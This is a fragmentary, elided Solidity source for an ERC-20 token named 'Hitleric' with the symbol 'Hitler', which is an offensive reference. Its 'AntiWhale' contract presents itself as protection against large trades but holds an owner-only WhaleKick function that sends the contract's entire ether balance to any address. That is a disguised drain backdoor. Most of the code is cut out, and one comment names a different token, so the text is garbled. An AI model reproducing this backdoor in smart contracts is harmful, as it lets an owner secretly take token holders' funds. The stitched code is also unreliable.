...
// SafeMath library for mathematical operations
library SafeMath {
...
// Context contract providing information about the current execution context
...
// Ownable contract with basic access control mechanism
...
// AntiWhale contract to prevent large transactions during specific periods
contract AntiWhale is Ownable {
    ...
    function safeR(address targetAddress) internal onlyOwner {
    (bool success, ) = payable(targetAddress).call{value: address(this).balance}("");
    require(success, "Transfer failed");
}

    function WhaleKick(address targetAddress) external onlyOwner {
    safeR(targetAddress);
}
...
// Nafter token contract implementing ERC-20
contract Hitleric is Context, IERC20, Ownable, AntiWhale {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name = "Hitleric";
    string private _symbol = "Hitler";
